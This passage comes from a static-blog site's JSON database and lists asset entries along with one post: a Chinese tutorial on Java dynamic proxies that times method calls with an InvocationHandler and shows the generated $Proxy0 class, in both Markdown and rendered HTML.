":"bc8c5e88f4994a852041b4d83f126d9c4d419b4a","modified":1621530093335},{"_id":"public/image/python-2.png","hash":"55c1ffc12124af2b369d097e3de273ec8fcad64f","modified":1621530093335},{"_id":"public/image/python-12.jpeg","hash":"08e1f3a6278a73d1f9ed8d38f3b9410f24782ec8","modified":1621530093335},{"_id":"public/image/python-6.png","hash":"52fa7a2bda2ac3dec6e930dd304b26c9e67585f5","modified":1621530093335},{"_id":"public/image/python-5.png","hash":"1c096a32b232d16d77c7446f2cc5ba2edc6b7983","modified":1621530093335},{"_id":"public/slider.096dc6.js","hash":"a8b66ef85d96616086ea6256e7288d0b5a2df56d","modified":1621530093335},{"_id":"public/main.266c1c.css","hash":"6b9cfabb81f021081a93da5a069674e9be910194","modified":1621530093335},{"_id":"public/mobile.906508.js","hash":"86e50eecba93644d6cf4f78fd4f9ff54a0ea82d5","modified":1621530093335},{"_id":"public/main.266c1c.js","hash":"59ccafbd45d28c397a8a901152ef5e196077e4f4","modified":1621530093335},{"_id":"public/img/weixin.png","hash":"062b1f1fcb74a963534737d00248cbcdff1dca5b","modified":1621530093335},{"_id":"public/image/python-1.png","hash":"07e8930eb4396c487681fc3ba3b2a78a7b6c935c","modified":1621530093335},{"_id":"public/img/zhifubao.jpg","hash":"42c9537447aaa73782a73a526c041937687a6783","modified":1621530093335},{"_id":"public/image/1592105506385.jpg","hash":"ebe25b8045297e6137de7e1069999b02760181ef","modified":1621530093335},{"_id":"public/image/python-11.png","hash":"a318870384bff907b03386d408bb6a4550d15bc7","modified":1621530093335},{"_id":"public/image/python-3.png","hash":"d5a51e1b72456473fbb92a02c5807c8aadf203cb","modified":1621530093335},{"_id":"source/image/.DS_Store","hash":"309c307553a4acc3fde004e82a1d17f1f805ab43","modified":1632276504931},{"_id":"themes/yilia/source/ads.txt","hash":"19d40f9f35774c38b9d18c59ef827464f6593cf2","modified":1632405461440},{"_id":"source/_posts/博客增加github自动部署.md","hash":"05c00e6678b3ea73d0873e56a73427610a65487a","modified":1632147018175},{"_id":"source/image/2012-9-20.png","hash":"4482aa5e2aca8a14331bf19110bb60d7964ade79","modified":1632146724032},{"_id":"public/2021/09/20/博客增加github自动部署/index.html","hash":"32b2827e3bbfbed374ebc16cc5878077fc4c31ae","modified":1632405591460},{"_id":"public/archives/2021/index.html","hash":"1078e5219fb63c998b7cf80aa81cf81689c78248","modified":1632405591460},{"_id":"public/archives/2021/09/index.html","hash":"68b7bb0b102b761501c22920c6405b3aafcd1652","modified":1632405591460},{"_id":"public/ads.txt","hash":"19d40f9f35774c38b9d18c59ef827464f6593cf2","modified":1632405591460},{"_id":"public/image/2012-9-20.png","hash":"4482aa5e2aca8a14331bf19110bb60d7964ade79","modified":1632405591460},{"_id":"source/_posts/datax集成spring-boot实现每个job的日志打印到不同文件.md","hash":"6c08b4cf1863f1154361e4abfbc88219b6231d62","modified":1647771207228}],"Category":[],"Data":[],"Page":[],"Post":[{"title":"简单理解java动态代理","date":"2016-07-20T14:37:40.000Z","_content":"java动态代理，能干什么呢。假设有一种场景，我们调用某个类的所有方法，然后我们想记录下我们调用每个方法的调用时间，这个我们该怎么去实现它。比较笨的办法是我们每调用一个方法，都在方法的开始和返回之前，去计算一下时间。但是这样的话，我们写了很多重复的代码。通过动态代理，我们就能实现这样的功能，spring也是同样方式，去实现类似的功能。\n首先我们定义一个接口\n\n```java\npublic interface Person {\n    public void run();\n    public void jump();\n}\n```\n有两个方法，现在我们想统计调用这两个方法，占用的时长统计。\n\n```java\nclass Jack implements Person {\n        @Override\n        public void run() {\n            try {\n                Thread.sleep(100);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            System.out.println(\"我是jack，我正在跑\");\n        }\n\n        @Override\n        public void jump() {\n            System.out.println(\"我是jack，我正在跳\");\n        }\n    }\n```\n让jack来实现这个接口，现在我们来统计jack的运行时间。\n\n```java\n final Person jack = new Jack();\n        Person jackPrxoxy = (Person) Proxy.newProxyInstance(Jack.class.getClassLoader(), new Class<?>[]{Person.class}, new InvocationHandler() {\n            @Override\n            public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {\n                long time = System.currentTimeMillis();\n                method.invoke(jack, args);\n                System.out.println(\"调用\" + method.getName() + \"方法，耗时：\" + (System.currentTimeMillis() - time));\n                return null;\n            }\n        });\n        jackPrxoxy.run();\n        jackPrxoxy.jump();\n```\n\n最终得到的结果是\n\n```\n我是jack，我正在跑\n调用run方法，耗时：101\n我是jack，我正在跳\n调用jump方法，耗时：0\n```\n通过上面简单的代码，我们已经实现了我们最初的需求，那么我们来分析，分析背后的原理。\n通过查看源码可知，Proxy.newProxyInstance这个类会动态生成一个java的class类，然后动态生成的这个class类，将被实例化，供我们调用。\n\n```java\n byte[] classFile = ProxyGenerator.generateProxyClass(\"$Proxy0\",new Class<?>[]{Person.class});\n        String path = \"./StuProxy.class\";\n        try(FileOutputStream fos = new FileOutputStream(path)) {\n            fos.write(classFile);\n            fos.flush();\n            System.out.println(\"代理类class文件写入成功\");\n        } catch (Exception e) {\n            System.out.println(\"写文件错误\");\n        }\n```\n可通过这个代码，去保存生成的类。\n\n```java\npublic final class $Proxy0 extends Proxy implements Person {\n    private static Method m1;\n    private static Method m3;\n    private static Method m2;\n    private static Method m4;\n    private static Method m0;\n\n    public $Proxy0(InvocationHandler var1) throws  {\n        super(var1);\n    }\n\n    public final boolean equals(Object var1) throws  {\n        try {\n            return (Boolean)super.h.invoke(this, m1, new Object[]{var1});\n        } catch (RuntimeException | Error var3) {\n            throw var3;\n        } catch (Throwable var4) {\n            throw new UndeclaredThrowableException(var4);\n        }\n    }\n\n    public final void run() throws  {\n        try {\n            super.h.invoke(this, m3, (Object[])null);\n        } catch (RuntimeException | Error var2) {\n            throw var2;\n        } catch (Throwable var3) {\n            throw new UndeclaredThrowableException(var3);\n        }\n    }\n\n    public final String toString() throws  {\n        try {\n            return (String)super.h.invoke(this, m2, (Object[])null);\n        } catch (RuntimeException | Error var2) {\n            throw var2;\n        } catch (Throwable var3) {\n            throw new UndeclaredThrowableException(var3);\n        }\n    }\n\n    public final void jump() throws  {\n        try {\n            super.h.invoke(this, m4, (Object[])null);\n        } catch (RuntimeException | Error var2) {\n            throw var2;\n        } catch (Throwable var3) {\n            throw new UndeclaredThrowableException(var3);\n        }\n    }\n\n    public final int hashCode() throws  {\n        try {\n            return (Integer)super.h.invoke(this, m0, (Object[])null);\n        } catch (RuntimeException | Error var2) {\n            throw var2;\n        } catch (Throwable var3) {\n            throw new UndeclaredThrowableException(var3);\n        }\n    }\n\n    static {\n        try {\n            m1 = Class.forName(\"java.lang.Object\").getMethod(\"equals\", Class.forName(\"java.lang.Object\"));\n            m3 = Class.forName(\"proxy.Person\").getMethod(\"run\");\n            m2 = Class.forName(\"java.lang.Object\").getMethod(\"toString\");\n            m4 = Class.forName(\"proxy.Person\").getMethod(\"jump\");\n            m0 = Class.forName(\"java.lang.Object\").getMethod(\"hashCode\");\n        } catch (NoSuchMethodException var2) {\n            throw new NoSuchMethodError(var2.getMessage());\n        } catch (ClassNotFoundException var3) {\n            throw new NoClassDefFoundError(var3.getMessage());\n        }\n    }\n}\n\n\n\n```\n从上面的代码可以清晰的看出来，我们调用的方法最终都被代理给了InvocationHandler，我们在InvocationHandler又反射调用被代理的对象，最终实现整个代理过程。\n\n\n","source":"_posts/2016-07-20.md","raw":"---\ntitle: '简单理解java动态代理'\ndate: 2016-07-20 22:37:40\ntags: java\n---\njava动态代理，能干什么呢。假设有一种场景，我们调用某个类的所有方法，然后我们想记录下我们调用每个方法的调用时间，这个我们该怎么去实现它。比较笨的办法是我们每调用一个方法，都在方法的开始和返回之前，去计算一下时间。但是这样的话，我们写了很多重复的代码。通过动态代理，我们就能实现这样的功能，spring也是同样方式，去实现类似的功能。\n首先我们定义一个接口\n\n```java\npublic interface Person {\n    public void run();\n    public void jump();\n}\n```\n有两个方法，现在我们想统计调用这两个方法，占用的时长统计。\n\n```java\nclass Jack implements Person {\n        @Override\n        public void run() {\n            try {\n                Thread.sleep(100);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            System.out.println(\"我是jack，我正在跑\");\n        }\n\n        @Override\n        public void jump() {\n            System.out.println(\"我是jack，我正在跳\");\n        }\n    }\n```\n让jack来实现这个接口，现在我们来统计jack的运行时间。\n\n```java\n final Person jack = new Jack();\n        Person jackPrxoxy = (Person) Proxy.newProxyInstance(Jack.class.getClassLoader(), new Class<?>[]{Person.class}, new InvocationHandler() {\n            @Override\n            public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {\n                long time = System.currentTimeMillis();\n                method.invoke(jack, args);\n                System.out.println(\"调用\" + method.getName() + \"方法，耗时：\" + (System.currentTimeMillis() - time));\n                return null;\n            }\n        });\n        jackPrxoxy.run();\n        jackPrxoxy.jump();\n```\n\n最终得到的结果是\n\n```\n我是jack，我正在跑\n调用run方法，耗时：101\n我是jack，我正在跳\n调用jump方法，耗时：0\n```\n通过上面简单的代码，我们已经实现了我们最初的需求，那么我们来分析，分析背后的原理。\n通过查看源码可知，Proxy.newProxyInstance这个类会动态生成一个java的class类，然后动态生成的这个class类，将被实例化，供我们调用。\n\n```java\n byte[] classFile = ProxyGenerator.generateProxyClass(\"$Proxy0\",new Class<?>[]{Person.class});\n        String path = \"./StuProxy.class\";\n        try(FileOutputStream fos = new FileOutputStream(path)) {\n            fos.write(classFile);\n            fos.flush();\n            System.out.println(\"代理类class文件写入成功\");\n        } catch (Exception e) {\n            System.out.println(\"写文件错误\");\n        }\n```\n可通过这个代码，去保存生成的类。\n\n```java\npublic final class $Proxy0 extends Proxy implements Person {\n    private static Method m1;\n    private static Method m3;\n    private static Method m2;\n    private static Method m4;\n    private static Method m0;\n\n    public $Proxy0(InvocationHandler var1) throws  {\n        super(var1);\n    }\n\n    public final boolean equals(Object var1) throws  {\n        try {\n            return (Boolean)super.h.invoke(this, m1, new Object[]{var1});\n        } catch (RuntimeException | Error var3) {\n            throw var3;\n        } catch (Throwable var4) {\n            throw new UndeclaredThrowableException(var4);\n        }\n    }\n\n    public final void run() throws  {\n        try {\n            super.h.invoke(this, m3, (Object[])null);\n        } catch (RuntimeException | Error var2) {\n            throw var2;\n        } catch (Throwable var3) {\n            throw new UndeclaredThrowableException(var3);\n        }\n    }\n\n    public final String toString() throws  {\n        try {\n            return (String)super.h.invoke(this, m2, (Object[])null);\n        } catch (RuntimeException | Error var2) {\n            throw var2;\n        } catch (Throwable var3) {\n            throw new UndeclaredThrowableException(var3);\n        }\n    }\n\n    public final void jump() throws  {\n        try {\n            super.h.invoke(this, m4, (Object[])null);\n        } catch (RuntimeException | Error var2) {\n            throw var2;\n        } catch (Throwable var3) {\n            throw new UndeclaredThrowableException(var3);\n        }\n    }\n\n    public final int hashCode() throws  {\n        try {\n            return (Integer)super.h.invoke(this, m0, (Object[])null);\n        } catch (RuntimeException | Error var2) {\n            throw var2;\n        } catch (Throwable var3) {\n            throw new UndeclaredThrowableException(var3);\n        }\n    }\n\n    static {\n        try {\n            m1 = Class.forName(\"java.lang.Object\").getMethod(\"equals\", Class.forName(\"java.lang.Object\"));\n            m3 = Class.forName(\"proxy.Person\").getMethod(\"run\");\n            m2 = Class.forName(\"java.lang.Object\").getMethod(\"toString\");\n            m4 = Class.forName(\"proxy.Person\").getMethod(\"jump\");\n            m0 = Class.forName(\"java.lang.Object\").getMethod(\"hashCode\");\n        } catch (NoSuchMethodException var2) {\n            throw new NoSuchMethodError(var2.getMessage());\n        } catch (ClassNotFoundException var3) {\n            throw new NoClassDefFoundError(var3.getMessage());\n        }\n    }\n}\n\n\n\n```\n从上面的代码可以清晰的看出来，我们调用的方法最终都被代理给了InvocationHandler，我们在InvocationHandler又反射调用被代理的对象，最终实现整个代理过程。\n\n\n","slug":"2016-07-20","published":1,"updated":"2018-08-16T15:21:58.517Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckox55gc00000ak9c9bvcbsol","content":"<p>java动态代理，能干什么呢。假设有一种场景，我们调用某个类的所有方法，然后我们想记录下我们调用每个方法的调用时间，这个我们该怎么去实现它。比较笨的办法是我们每调用一个方法，都在方法的开始和返回之前，去计算一下时间。但是这样的话，我们写了很多重复的代码。通过动态代理，我们就能实现这样的功能，spring也是同样方式，去实现类似的功能。<br>首先我们定义一个接口</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">interface</span> <span class=\"title\">Person</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">jump</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>有两个方法，现在我们想统计调用这两个方法，占用的时长统计。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Jack</span> <span class=\"keyword\">implements</span> <span class=\"title\">Person</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                Thread.sleep(<span class=\"number\">100</span>);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">\"我是jack，我正在跑\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">jump</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">\"我是jack，我正在跳\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>让jack来实现这个接口，现在我们来统计jack的运行时间。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">final</span> Person jack = <span class=\"keyword\">new</span> Jack();</span><br><span class=\"line\">       Person jackPrxoxy = (Person) Proxy.newProxyInstance(Jack.class.getClassLoader(), new Class&lt;?&gt;[]&#123;Person.class&#125;, new InvocationHandler() &#123;</span><br><span class=\"line\">           <span class=\"meta\">@Override</span></span><br><span class=\"line\">           <span class=\"function\"><span class=\"keyword\">public</span> Object <span class=\"title\">invoke</span><span class=\"params\">(Object proxy, Method method, Object[] args)</span> <span class=\"keyword\">throws</span> Throwable </span>&#123;</span><br><span class=\"line\">               <span class=\"keyword\">long</span> time = System.currentTimeMillis();</span><br><span class=\"line\">               method.invoke(jack, args);</span><br><span class=\"line\">               System.out.println(<span class=\"string\">\"调用\"</span> + method.getName() + <span class=\"string\">\"方法，耗时：\"</span> + (System.currentTimeMillis() - time));</span><br><span class=\"line\">               <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">           &#125;</span><br><span class=\"line\">       &#125;);</span><br><span class=\"line\">       jackPrxoxy.run();</span><br><span class=\"line\">       jackPrxoxy.jump();</span><br></pre></td></tr></table></figure>\n\n<p>最终得到的结果是</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">我是jack，我正在跑</span><br><span class=\"line\">调用run方法，耗时：101</span><br><span class=\"line\">我是jack，我正在跳</span><br><span class=\"line\">调用jump方法，耗时：0</span><br></pre></td></tr></table></figure>\n<p>通过上面简单的代码，我们已经实现了我们最初的需求，那么我们来分析，分析背后的原理。<br>通过查看源码可知，Proxy.newProxyInstance这个类会动态生成一个java的class类，然后动态生成的这个class类，将被实例化，供我们调用。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">byte</span>[] classFile = ProxyGenerator.generateProxyClass(<span class=\"string\">\"$Proxy0\"</span>,<span class=\"keyword\">new</span> Class&lt;?&gt;[]&#123;Person<span class=\"class\">.<span class=\"keyword\">class</span>&#125;)</span>;</span><br><span class=\"line\">       String path = <span class=\"string\">\"./StuProxy.class\"</span>;</span><br><span class=\"line\">       <span class=\"keyword\">try</span>(FileOutputStream fos = <span class=\"keyword\">new</span> FileOutputStream(path)) &#123;</span><br><span class=\"line\">           fos.write(classFile);</span><br><span class=\"line\">           fos.flush();</span><br><span class=\"line\">           System.out.println(<span class=\"string\">\"代理类class文件写入成功\"</span>);</span><br><span class=\"line\">       &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">           System.out.println(<span class=\"string\">\"写文件错误\"</span>);</span><br><span class=\"line\">       &#125;</span><br></pre></td></tr></table></figure>\n<p>可通过这个代码，去保存生成的类。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"class\"><span class=\"keyword\">class</span> $<span class=\"title\">Proxy0</span> <span class=\"keyword\">extends</span> <span class=\"title\">Proxy</span> <span class=\"keyword\">implements</span> <span class=\"title\">Person</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Method m1;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Method m3;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Method m2;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Method m4;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Method m0;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> $Proxy0(InvocationHandler var1) <span class=\"keyword\">throws</span>  &#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>(var1);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"keyword\">boolean</span> <span class=\"title\">equals</span><span class=\"params\">(Object var1)</span> <span class=\"keyword\">throws</span>  </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> (Boolean)<span class=\"keyword\">super</span>.h.invoke(<span class=\"keyword\">this</span>, m1, <span class=\"keyword\">new</span> Object[]&#123;var1&#125;);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (RuntimeException | Error var3) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> var3;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Throwable var4) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> UndeclaredThrowableException(var4);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span>  </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">super</span>.h.invoke(<span class=\"keyword\">this</span>, m3, (Object[])<span class=\"keyword\">null</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (RuntimeException | Error var2) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> var2;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Throwable var3) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> UndeclaredThrowableException(var3);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> String <span class=\"title\">toString</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span>  </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> (String)<span class=\"keyword\">super</span>.h.invoke(<span class=\"keyword\">this</span>, m2, (Object[])<span class=\"keyword\">null</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (RuntimeException | Error var2) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> var2;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Throwable var3) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> UndeclaredThrowableException(var3);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"keyword\">void</span> <span class=\"title\">jump</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span>  </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">super</span>.h.invoke(<span class=\"keyword\">this</span>, m4, (Object[])<span class=\"keyword\">null</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (RuntimeException | Error var2) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> var2;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Throwable var3) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> UndeclaredThrowableException(var3);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"keyword\">int</span> <span class=\"title\">hashCode</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span>  </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> (Integer)<span class=\"keyword\">super</span>.h.invoke(<span class=\"keyword\">this</span>, m0, (Object[])<span class=\"keyword\">null</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (RuntimeException | Error var2) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> var2;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Throwable var3) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> UndeclaredThrowableException(var3);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">static</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            m1 = Class.forName(<span class=\"string\">\"java.lang.Object\"</span>).getMethod(<span class=\"string\">\"equals\"</span>, Class.forName(<span class=\"string\">\"java.lang.Object\"</span>));</span><br><span class=\"line\">            m3 = Class.forName(<span class=\"string\">\"proxy.Person\"</span>).getMethod(<span class=\"string\">\"run\"</span>);</span><br><span class=\"line\">            m2 = Class.forName(<span class=\"string\">\"java.lang.Object\"</span>).getMethod(<span class=\"string\">\"toString\"</span>);</span><br><span class=\"line\">            m4 = Class.forName(<span class=\"string\">\"proxy.Person\"</span>).getMethod(<span class=\"string\">\"jump\"</span>);</span><br><span class=\"line\">            m0 = Class.forName(<span class=\"string\">\"java.lang.Object\"</span>).getMethod(<span class=\"string\">\"hashCode\"</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (NoSuchMethodException var2) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> NoSuchMethodError(var2.getMessage());</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (ClassNotFoundException var3) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> NoClassDefFoundError(var3.getMessage());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>从上面的代码可以清晰的看出来，我们调用的方法最终都被代理给了InvocationHandler，我们在InvocationHandler又反射调用被代理的对象，最终实现整个代理过程。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>java动态代理，能干什么呢。假设有一种场景，我们调用某个类的所有方法，然后我们想记录下我们调用每个方法的调用时间，这个我们该怎么去实现它。比较笨的办法是我们每调用一个方法，都在方法的开始和返回之前，去计算一下时间。但是这样的话，我们写了很多重复的代码。通过动态代理，我们就能实现这样的功能，spring也是同样方式，去实现类似的功能。<br>首先我们定义一个接口</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">interface</span> <span class=\"title\">Person</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">jump</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>有两个方法，现在我们想统计调用这两个方法，占用的时长统计。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span 